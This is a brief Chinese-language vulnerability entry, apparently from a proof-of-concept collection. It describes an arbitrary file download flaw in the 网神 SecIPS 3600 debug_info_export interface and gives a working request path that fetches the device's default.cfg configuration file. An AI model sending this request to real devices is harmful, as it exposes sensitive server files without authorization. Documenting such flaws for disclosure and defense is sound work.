# 网神 SecIPS 3600 debug_info_export 任意文件下载漏洞

## 漏洞描述
网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20230314090018282](images/image-20230314090018282.png)

验证POC

```
/webui/debug/debug_info_export?filename=default.cfg
```


## Payloads
```
/webui/debug/debug_info_export?filename=default.cfg
```
